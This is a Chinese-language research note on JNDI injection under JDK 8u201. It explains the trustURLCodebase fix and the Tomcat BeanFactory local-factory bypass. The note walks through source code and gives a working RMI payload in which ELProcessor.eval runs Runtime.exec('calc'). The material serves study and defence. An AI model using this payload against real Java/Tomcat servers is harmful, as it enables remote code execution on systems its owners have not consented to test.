参考博客：

[JNDI注入与动态类加载](https://halfblue.github.io/2021/11/18/JNDI%E6%B3%A8%E5%85%A5%E4%B8%8E%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/)

[探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1405/)

# 分析版本

jdk8u201

# 分析流程

## 修复

在ldap绕过中，我们讲了LDAP的修复，下面用jdk8u201具体来看下修复。

修复之前，利用是在LdapCtx.java中的`return DirectoryManager.getObjectInstance(var3, var1, this, this.envprops, (Attributes)var4);`动态加载Reference。

跟进看在codeBase路径中查找类处，

```java
static ObjectFactory getObjectFactoryFromReference(
    Reference ref, String factoryName)
    throws IllegalAccessException,
    InstantiationException,
    MalformedURLException {
    Class<?> clas = null;

    // Try to use current class loader
    try {
         clas = helper.loadClass(factoryName);   //本地查找类
    } catch (ClassNotFoundException e) {
        // ignore and continue
        // e.printStackTrace();
    }
    // All other exceptions are passed up.

    // Not in class path; try to use codebase
    String codebase;
    if (clas == null &&
            (codebase = ref.getFactoryClassLocation()) != null) {
        try {
            clas = helper.loadClass(factoryName, codebase); //根据codeBase查找类
        } catch (ClassNotFoundException e) {
        }
    }

    return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
}
```

跟进`clas = helper.loadClass(factoryName, codebase);`

```java
public Class<?> loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {
    if ("true".equalsIgnoreCase(trustURLCodebase)) { //加入判断，trustURLCodebase为true，才加载类。这里默认false
        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    } else {
        return null;
    }
}
```

## 本地factory绕过

这里面就不用区分JNDI结合RMI还是LDAP了，通用的。下面拿JNDI+RMI进行分析

### 分析攻击点

上面讲到了RMI，CORBA，LDAP漏洞被修复了，漏洞出现在客户端拿到Reference后，通过Reference加载codeBase路径下的factory处。、

修复方法就是默认不允许加载远程factory。但是Reference是可以正常获取的。

我们就想能不能找到本地的可以被恶意利用的factory类。

### 利用链寻找

看下JNDI+RMI中，拿到Reference之后做什么

```java
//NamingManager#getObjectInstance
public static Object
    getObjectInstance(Object refInfo, Name name, Context nameCtx,
                      Hashtable<?,?> environment)
    throws Exception
{

    ObjectFactory factory;

    // Use builder if installed
    ObjectFactoryBuilder builder = getObjectFactoryBuilder();
    if (builder != null) {
        // builder must return non-null factory
        factory = builder.createObjectFactory(refInfo, environment);
        return factory.getObjectInstance(refInfo, name, nameCtx,
            environment);
    }

    // Use reference if possible
    Reference ref = null;
    if (refInfo instanceof Reference) {
        ref = (Reference) refInfo;
    } else if (refInfo instanceof Referenceable) {
        ref = ((Referenceable)(refInfo)).getReference();
    }

    Object answer;

    if (ref != null) {
        String f = ref.getFactoryClassName();
        if (f != null) {
            // if reference identifies a factory, use exclusively

            factory = getObjectFactoryFromReference(ref, f);                  ////本地动态加载factory
            if (factory != null) {
                return factory.getObjectInstance(ref, name, nameCtx,         ////factory调用getObjectInstance方法
                                                 environment);
            }
            // No factory found, so return original refInfo.
            // Will reach this point if factory class is not in
            // class path and reference does not contain a URL for it
            return refInfo;

        } else {
            // if reference has no factory, check for addresses
            // containing URLs

            answer = processURLAddrs(ref, name, nameCtx, environment);
            if (answer != null) {
                return answer;
            }
        }
    }

    // try using any specified factories
    answer =
        createObjectFromFactories(refInfo, name, nameCtx, environment);
    return (answer != null) ? answer : refInfo;
}
```

加载了本地factory后，调用其getObjectInstance方法。

**我们要找的利用类需要满足**

1. **实现ObjectFactory，因为`getObjectFactoryFromReference(ref, f);`存在ObjectFactory的强转。**
2. **在调用其getObjectInstance时，可以触发危险方法**

最后找到的是tomcat中的BeanFactory

```java
//BeanFactory#getObjectInstance
public Object getObjectInstance(Object obj, Name name, Context nameCtx,
                                Hashtable<?,?> environment)
    throws NamingException {

    if (obj instanceof ResourceRef) {

        try {

            Reference ref = (Reference) obj;
            String beanClassName = ref.getClassName();
            Class<?> beanClass = null;
            ClassLoader tcl =
                Thread.currentThread().getContextClassLoader();
            if (tcl != null) {
                try {
                    beanClass = tcl.loadClass(beanClassName);
                } catch(ClassNotFoundException e) {
                }
            } else {
                try {
                    beanClass = Class.forName(beanClassName);
                } catch(ClassNotFoundException e) {
                    e.printStackTrace();
                }
            }
            if (beanClass == null) {
                throw new NamingException
                    ("Class not found: " + beanClassName);
            }

            BeanInfo bi = Introspector.getBeanInfo(beanClass);
            PropertyDescriptor[] pda = bi.getPropertyDescriptors();

            Object bean = beanClass.getConstructor().newInstance();    //获取构造函数，并实例化

            /* Look for properties with explicitly configured setter */
            RefAddr ra = ref.get("forceString");
            Map<String, Method> forced = new HashMap<>();
            String value;

            if (ra != null) {
                value = (String)ra.getContent();
                Class<?> paramTypes[] = new Class[1];
                paramTypes[0] = String.class;
                String setterName;
                int index;

                /* Items are given as comma separated list */
                for (String param: value.split(",")) {
                    param = param.trim();
                    /* A single item can either be of the form name=method
                     * or just a property name (and we will use a standard
                     * setter) */
                    index = param.indexOf('=');
                    if (index >= 0) {
                        setterName = param.substring(index + 1).trim();
                        param = param.substring(0, index).trim();
                    } else {
                        setterName = "set" +
                                     param.substring(0, 1).toUpperCase(Locale.ENGLISH) +
                                     param.substring(1);
                    }
                    try {
                        forced.put(param,
                                   beanClass.getMethod(setterName, paramTypes));
                    } catch (NoSuchMethodException|SecurityException ex) {
                        throw new NamingException
                            ("Forced String setter " + setterName +
                             " not found for property " + param);
                    }
                }
            }

            Enumeration<RefAddr> e = ref.getAll();

            while (e.hasMoreElements()) {

                ra = e.nextElement();
                String propName = ra.getType();

                if (propName.equals(Constants.FACTORY) ||
                    propName.equals("scope") || propName.equals("auth") ||
                    propName.equals("forceString") ||
                    propName.equals("singleton")) {
                    continue;
                }

                value = (String)ra.getContent();

                Object[] valueArray = new Object[1];

                /* Shortcut for properties with explicitly configured setter */
                Method method = forced.get(propName);
                if (method != null) {
                    valueArray[0] = value;
                    try {
                        method.invoke(bean, valueArray);                //反射调用bean的method方法
                    } 
```



### payload

测试前先把tomcat依赖加上（我开始用的8.5.90，tomcat把这儿就已经修复了）

```xml
<dependencies>
    <dependency>
        <groupId>org.apache.tomcat.embed</groupId>
        <artifactId>tomcat-embed-core</artifactId>
        <version>8.5.71</version> <!-- Latest version as of writing -->
    </dependency>
    <dependency>
        <groupId>org.glassfish</groupId>
        <artifactId>javax.el</artifactId>
        <version>3.0.0</version>
    </dependency>
</dependencies>
```

根据上面分析写出payload

```java
public class JNDIRMIServerBypass {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);

        resourceRef.add(new StringRefAddr("forceString", "x=eval"));
        resourceRef.add(new StringRefAddr("x", "Runtime.getRuntime().exec('calc')"));

        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
        BeanFactory
    }
```

![image-20240730154148956](https://s2.loli.net/2024/07/30/59nJR4WFC8HtIhr.png)

跟下攻击流程

下图是从拿到的Reference中获取factory（BeanFactory），之后调用BeanFactory的getObjectInstance方法。

![image-20240730160802718](https://s2.loli.net/2024/07/30/BHwEk1qCf4NJ5ma.png)

跟进BeanFactory#getObjectInstance

获取Reference的ClassName（javax.el.ELProcessor），并loadClass，得到ELProcessor类。

![image-20240730161347584](https://s2.loli.net/2024/07/30/8Xi4dGAxkSnCbqF.png)

调用ELProcessor的无参构造函数。

之后先把eval方法存到forced（hashMap）中，key为输入的x

![image-20240730163056671](https://s2.loli.net/2024/07/30/Y1tiDmcWPNq6s7S.png)

![image-20240730162642405](https://s2.loli.net/2024/07/30/VxZanJu1GKdWXhg.png)

之后获取propName为x，反射调用eval（通过x去forced中查找）

![image-20240730162031667](https://s2.loli.net/2024/07/30/zinYJ4ObQaVedmh.png)

这个方法需要Tomcat8环境的，现在java一般都是用Spring Boot框架开发，而Spring Boot内置了Tomcat，场景还是很多

## 其他利用方法

可以参考[探索高版本 JDK 下 JNDI 漏洞的利用方法 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1405/)的博客